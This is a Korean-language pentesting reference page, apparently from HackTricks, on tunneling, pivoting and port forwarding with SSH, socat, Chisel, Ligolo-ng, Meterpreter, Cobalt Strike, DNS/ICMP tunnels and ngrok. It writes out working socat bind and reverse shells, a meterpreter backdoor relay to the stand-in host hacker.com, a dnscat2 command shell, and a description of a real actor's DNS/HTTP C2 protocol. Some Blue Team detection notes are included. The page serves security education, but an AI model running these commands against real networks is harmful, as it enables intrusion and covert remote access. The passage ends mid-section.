# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap 팁

> [!WARNING]
> Nmap의 proxy 지원은 TCP 연결로 제한되며 ping, port 또는 OS-detection scan에는 영향을 주지 않습니다. scanner가 SOCKS proxy 뒤에 있는 경우 **host discovery를 비활성화**하고 (`-Pn`) **TCP connect scan**을 사용하세요 (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

최종 명령은 Evil-WinRM의 `-u` 및 `-i` 옵션을 사용하여 account와 WinRM host를 식별합니다. WinRM의 기본 port는 5985입니다.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH는 암호화된 채널을 통해 X11 연결, 임의의 TCP 포트 및 Unix-domain socket을 전달할 수 있습니다.<sup>[[6]](#references)</sup>

SSH 그래픽 연결 (X)

`-Y`는 trusted X11 forwarding을 활성화하고, `-C`는 forwarded data의 compression을 요청합니다.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

SSH Server에서 새 Port 열기 --> Other port

Remote (`-R`) forwarding은 SSH server에서 listen하고 local side에 연결합니다. 명시적인 bind address는 해당 listener에 연결할 수 있는 interface를 제어합니다.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Local port --> Compromised host (SSH) --> Third_box:Port

Local (`-L`) forwarding은 client에서 수신 대기하고 SSH server 측에서 destination에 연결합니다.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

로컬 포트 --> 침해된 호스트 (SSH) --> 어디든

Dynamic (`-D`) 포워딩은 원격 측에서 연결이 열리는 로컬 SOCKS4/SOCKS5 리스너를 생성합니다.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

내부 호스트에서 DMZ를 거쳐 사용자의 호스트로 reverse shells을 가져오는 데 유용합니다:

서버의 `GatewayPorts` 설정은 remote forward가 loopback을 벗어난 주소에 bind할 수 있는지를 제어하며, 기본값은 `no`입니다.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

이 root 기반 예시는 양쪽 호스트에 tunnel device를 생성합니다. 서버는 tun forwarding을 허용해야 하며 선택한 account는 tun device에 액세스할 수 있어야 합니다. 여기서는 `root` account를 사용하는 방법 중 하나로 `PermitRootLogin yes`를 설정할 수 있습니다.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Server 측에서 forwarding 활성화
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
클라이언트 측에 새 route 설정
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6은 Terrapin의 초기 전송 무결성 공격에 대응하기 위해 strict-KEX extension을 추가했습니다. 가능한 경우 양쪽 peer를 모두 업데이트하고, 이전 구현에서는 전달된 channel이 버전만으로 보호된다고 가정하지 말고 vendor guidance를 따르세요.<sup>[[8]](#references)</sup>

## SSHUTTLE

호스트를 통해 **ssh**로 모든 **traffic**을 **subnetwork**으로 **tunnel**할 수 있습니다.\
예를 들어 10.10.10.0/24로 향하는 모든 traffic을 forwarding할 수 있습니다.

`sshuttle`은 SSH를 통한 transparent proxying을 제공하며, 아래와 같이 subnets와 custom SSH command를 선택할 수 있습니다.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
private key를 사용하여 연결
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploit의 `portfwd`는 local 및 remote forwarding을 지원하며, SOCKS proxy module은 session routes 또는 `autoroute`와 함께 작동하도록 설계되었습니다. 이 예시에서는 기본적으로 port 1080에서 listen합니다.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Local port --> Compromised host (active session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
또 다른 방법:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Cobalt Strike의 Beacon은 SOCKS4a/SOCKS5 연결을 Beacon을 통해 relay할 수 있습니다. `rportfwd`는 침해된 호스트에서 bind하고, `rportfwd_local`은 Cobalt Strike client에서 destination connection을 시작합니다.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Beacon을 통해 traffic을 route해야 하는 interface의 Team Server에서 port를 엽니다.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> 이 경우 **port는 Team Server가 아니라 Beacon host에서 열리며**, traffic은 Team Server로 전송된 다음 Team Server에서 지정된 host:port로 전달됩니다.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
reverse-forwarding manual은 다음 동작을 설명합니다:<sup>[[14]](#references)</sup>

- Beacon의 reverse port forward는 **개별 머신 간 릴레이가 아니라 Team Server로 traffic을 tunnel링하도록 설계**되었습니다.
- Traffic은 P2P links를 포함하여 **Beacon의 C2 traffic 내부에서 tunnel링**됩니다.
- 높은 port는 일반적으로 privileged-port 제한을 피하지만, 대상 OS 정책과 기존 listener는 여전히 적용됩니다.

### rPort2Port local

> [!WARNING]
> 이 경우 **port는 Team Server가 아니라 Beacon host에서 열리며**, **traffic은 Team Server가 아닌 Cobalt Strike client로 전송**된 후 Cobalt Strike client에서 지정된 host:port로 전달됩니다.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

이 project는 `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp`, `tunnel.php`와 같은 web tunnel endpoint를 제공합니다. local proxy를 시작하기 전에 지원되는 endpoint 하나를 업로드하세요.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)의 releases 페이지에서 다운로드할 수 있습니다.\
Chisel은 SSH로 보호되는 연결을 사용하여 HTTP를 통해 TCP/UDP 트래픽을 전달합니다. 호환되는 client/server 빌드를 사용하고 선택한 release의 command syntax를 확인하세요.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng quickstart는 proxy에 TUN interface를 구성하고, agent에 대한 certificate-fingerprint validation과 tunneled network를 위한 route setup을 설명합니다.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent Binding 및 Listening

Ligolo-ng는 agent에 listener를 추가하여 proxy 측 주소로 forward할 수 있으며, 예약된 `240.0.0.0/4` 범위를 라우팅하면 agent 로컬 서비스에 접근할 수 있습니다.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Agent의 Local Port에 Access
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot은 victim에서 reverse tunnel을 시작하고 attacker의 loopback address에 SOCKS4 proxy를 노출합니다. README에는 NTLM-proxy credentials 및 hash 옵션도 설명되어 있습니다.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
**NTLM proxy**를 통한 Pivot
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat은 `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL`, `PROXY`와 같은 address type을 조합합니다. 아래 예제는 문서화된 이러한 endpoint를 결합합니다.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### socks를 통한 Port2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### SSL Socat을 통한 Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
socat의 문서화된 `PROXY` address type을 사용하면 victim의 console에서 마지막 줄 대신 다음 줄을 실행하여 **인증되지 않은 proxy**를 통과할 수 있습니다.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Client와 Server 양쪽에서 인증서를 생성합니다.
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

로컬 SSH 포트(22)를 공격자 호스트의 443 포트에 연결합니다.
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink는 `ssh`와 유사한 SSH forwarding 옵션을 제공하는 PuTTY의 command-line connection tool입니다.<sup>[[22]](#references)</sup>

SSH port에는 대문자 `-P`를 사용합니다. `-pw`는 호환성을 위해 유지되지만 process list에 password를 노출하므로, 가능한 경우 key authentication 또는 `-pwfile`을 사용하는 것이 좋습니다.<sup>[[22]](#references)[[23]](#references)</sup>

이 binary는 victim에서 실행되고 SSH client이므로, reverse connection을 위해 SSH service와 port를 열어야 합니다. 다음 예제에서는 `-R`을 사용해 locally accessible port를 attacker's machine으로 forward합니다.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

지속적인 `portproxy` 규칙을 생성하거나 변경할 때는 호스트에 필요한 권한이 있는 context를 사용하세요. Microsoft는 아래에서 사용되는 `v4tov4` 추가, 표시 및 삭제 형식을 문서화했습니다.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

**시스템에 대한 RDP 액세스가 있어야 합니다.**\
다운로드:

SocksOverRDP는 Remote Desktop Dynamic Virtual Channels를 사용하여 기존 RDP 세션을 통해 SOCKS5 연결을 전달합니다. 클라이언트 plugin은 `127.0.0.1:1080`에서 수신 대기하고, server component는 RDP target에서 실행됩니다.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 바이너리](https://github.com/nccgroup/SocksOverRDP/releases) - 이 tool은 Windows의 Remote Desktop Service 기능에 포함된 `Dynamic Virtual Channels`(`DVC`)를 사용합니다. DVC는 **RDP 연결을 통해 패킷을 tunneling**하는 역할을 합니다.
2. [Proxifier Portable 바이너리](https://www.proxifier.com/download/#win-tab)

클라이언트 컴퓨터에서 다음과 같이 **`SocksOverRDP-Plugin.dll`**을 로드합니다:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
이제 **mstsc.exe**를 사용하여 **피해자**에 **RDP**로 **연결**할 수 있으며, **SocksOverRDP 플러그인이 활성화되었고** **127.0.0.1:1080**에서 **수신 대기**한다는 **프롬프트**가 표시되어야 합니다.

**RDP**를 통해 **연결**하고 피해자 머신에 `SocksOverRDP-Server.exe` 바이너리를 업로드한 후 실행합니다:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
이제 공격자 머신에서 포트 1080이 수신 대기 중인지 확인합니다:
```
netstat -antb | findstr 1080
```
이제 [**Proxifier**](https://www.proxifier.com/)를 사용하여 해당 포트를 통해 traffic을 proxy할 수 있습니다.<sup>[[26]](#references)</sup>

## Windows GUI Apps Proxify

[**Proxifier**](https://www.proxifier.com/)를 사용하여 Windows GUI apps가 proxy를 통해 탐색하도록 만들 수 있습니다.<sup>[[26]](#references)</sup>\
**Profile -> Proxy Servers**에서 SOCKS server의 IP와 port를 추가합니다.\
**Profile -> Proxification Rules**에서 proxify할 프로그램 이름과 proxify하려는 IP에 대한 connections를 추가합니다. Proxifier rules는 applications, target hosts 및 ports를 기준으로 일치시킬 수 있습니다.<sup>[[27]](#references)</sup>

## NTLM proxy를 통한 Tunnel

앞서 언급한 tool인 **Rpivot**은 NTLM-authenticating proxy를 통해 relay할 수 있습니다. **OpenVPN**도 auth file과 NTLMv2 method로 구성하면 해당 proxy를 통해 route할 수 있습니다. 이는 proxy traversal이며 proxy authentication의 bypass가 아닙니다.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm은 upstream NTLM proxy에 인증하고, 로컬 listener를 노출하며, 로컬 tunnel port를 destination service에 매핑할 수 있습니다. 그런 다음 client는 해당 로컬 port를 사용할 수 있습니다.<sup>[[29]](#references)</sup>\
예를 들어 해당 port 443을 forward합니다.
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
이제 예를 들어 victim에서 **SSH** service가 port 443에서 listen하도록 설정하면, attacker port 2222를 통해 연결할 수 있습니다.<sup>[[29]](#references)</sup>\
attacker가 port 2222에서 listen하는 동안 localhost:443에 연결하는 **meterpreter**를 사용할 수도 있습니다.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy)는 Microsoft의 .NET reverse-proxy toolkit입니다. 여기에서 확인할 수 있습니다: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine은 DNS queries를 통해 IPv4 tunnel을 생성하고 TUN interfaces를 사용합니다. 문서에 설명된 setup에서는 양쪽 끝에서 해당 interfaces를 생성하는 데 필요한 privileges가 필요합니다.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS transport는 직접 TCP보다 overhead가 크고 일반적으로 느립니다. 다음을 사용하여 이 터널을 통해 압축된 SSH 연결을 생성할 수 있습니다:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**여기에서 다운로드**](https://github.com/iagox86/dnscat2)**.**

Dnscat2는 DNS를 통해 암호화된 command-and-control 채널을 설정합니다. 아래의 server 및 client 명령은 문서화된 사용법을 따릅니다.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **In PowerShell**

[**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell)을 사용하면 PowerShell에서 dnscat2 client를 실행할 수 있으며, 해당 README에는 아래에 표시된 `Start-Dnscat2` 매개변수가 문서화되어 있습니다.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **dnscat을 사용한 Port forwarding**

Dnscat2의 interactive `listen` command는 local listener를 remote host 및 port에 매핑합니다.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### proxychains DNS 변경

Proxychains-ng는 동적으로 링크된 TCP 연결을 후킹하며 UDP 또는 ICMP를 전달할 수 없습니다. DNS proxying은 설정 가능하므로 고정된 public resolver를 가정하지 말고, 설치된 `proxychains.conf`와 resolver helper를 확인하세요. Legacy `proxyresolv` scripts는 resolver 선택을 위해 `PROXY_DNS_SERVER`를 노출합니다. 내부 이름이 필요한 경우 pivot에서 접근 가능한 resolver를 사용하세요.<sup>[[34]](#references)[[35]](#references)</sup>

## Go의 Tunnels

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor는 corporate network에서 거의 차단되지 않는 두 protocol인 outbound **DNS**와 **plain HTTP POST** traffic만 악용하는 **dual-channel C2 ("AK47C2")**를 생성했습니다.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• 임의의 5-character SessionID(예: `H4T14`)를 생성합니다.
• *task requests*에는 `1`을, *results*에는 `2`를 앞에 붙인 다음 여러 field(flags, SessionID, computer name)를 연결합니다.
• 각 field는 **ASCII key `VHBD@H`로 XOR-encrypted**된 후 hex-encoded되며, dots로 연결되고 마지막에 attacker-controlled domain이 붙습니다:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests는 **TXT**(및 fallback **MG**) records에 `DnsQuery()`를 사용합니다.
• Response가 0xFF bytes를 초과하면 backdoor는 data를 63-byte pieces로 **fragments**하고 다음 markers를 삽입합니다:
`s<SessionID>t<TOTAL>p<POS>` — 이를 통해 C2 server가 순서를 다시 정렬할 수 있습니다.

2. **HTTP mode (AK47HTTP)**
• JSON envelope를 생성합니다:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• 전체 blob은 XOR-`VHBD@H` → hex 처리된 후 `Content-Type: text/plain` header가 포함된 **`POST /`**의 body로 전송됩니다.
• Reply는 동일한 encoding을 따르며 `cmd` field는 `cmd.exe /c <command> 2>&1`로 실행됩니다.

Blue Team notes
• 첫 번째 label이 긴 hexadecimal이고 항상 하나의 드문 domain으로 끝나는 비정상적인 **TXT queries**를 찾으세요.
• Constant XOR key와 ASCII-hex 조합은 YARA로 쉽게 탐지할 수 있습니다: `6?56484244?484` (`VHBD@H`의 hex).
• HTTP의 경우 순수 hex이며 2 bytes의 배수인 text/plain POST bodies를 flag하세요.

{{#note}}
이 channel은 각 sub-domain label을 63-octet DNS limit 이내로 유지하지만, protocol compliance 자체가 stealthy하다는 의미는 아닙니다. 드문 domains, 긴 hexadecimal labels 및 query volume은 여전히 detection signals입니다.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans는 TUN device와 ICMP echo requests를 사용하는 IPv4-over-ICMP tunnel을 설명하며, setup을 위해서는 interface를 생성할 수 있는 충분한 privileges가 필요합니다.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**여기에서 다운로드**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng는 ICMP를 통해 TCP 연결을 전송하며, 아래에 표시된 `-p`, `-l`, `-r`, `-R` 옵션을 각각 proxy, local listener, destination host, destination port에 사용합니다.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/)은 secure tunnel을 통해 로컬 네트워크 서비스를 온라인에 제공하는 agent입니다. CLI에는 HTTP, TCP 및 file URL endpoint가 문서화되어 있으며, 출력되는 endpoint hostname은 endpoint와 account에 따라 달라질 수 있습니다.<sup>[[39]](#references)</sup>

### 설치

- 계정 생성: https://ngrok.com/signup
- Client 다운로드:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 기본 사용법

**문서:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_필요한 경우 agent는 authentication 및 TLS 옵션도 지원합니다.<sup>[[39]](#references)</sup>_

#### TCP Tunneling
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### HTTP로 파일 노출하기
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### HTTP calls Sniffing

_XSS,SSRF,SSTI 등에 유용_\
standalone agent는 기본적으로 `http://127.0.0.1:4040`에서 HTTP inspection interface를 노출합니다. 이 interface는 HTTP traffic을 위한 것입니다.<sup>[[40]](#references)</sup>

#### 내부 HTTP service Tunneling

`--host-header=rewrite` 옵션은 upstream HTTP `Host` header를 local service와 일치하도록 다시 작성합니다.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml 간단한 구성 예시

이 구성은 ngrok Agent Config v2를 사용합니다. 이름이 지정된 터널은 `proto` 및 `addr`를 사용하며 `ngrok start`로 시작합니다.<sup>[[42]](#references)</sup> 다음 3개의 터널을 엽니다.

- TCP 2개
- `/tmp/httpbin/`의 정적 파일을 제공하는 HTTP 1개
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Cloudflare Tunnel의 `cloudflared` connector는 outbound connections를 설정합니다. published applications는 HTTP, HTTPS, TCP, SSH 및 RDP를 라우팅할 수 있으며, quick tunnels는 HTTP development 용도로 사용됩니다.<sup>[[43]](#references)[[45]](#references)</sup>

### Quick tunnel one-liner
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 origin (레거시 모드)

레거시 `--socks5` 플래그는 `cloudflared`에 로컬 origin이 SOCKS5를 사용한다고 알리며, 로컬 SOCKS5 listener를 생성하지는 않습니다. managed tunnel에서는 `originRequest.proxyType: socks`가 SOCKS5 origin 처리를 구성합니다.<sup>[[44]](#references)</sup>
```bash
# Expose a local SOCKS5-speaking origin (legacy syntax)
cloudflared tunnel --url socks5://localhost:1080 --socks5
```
### DNS를 사용한 지속적인 터널

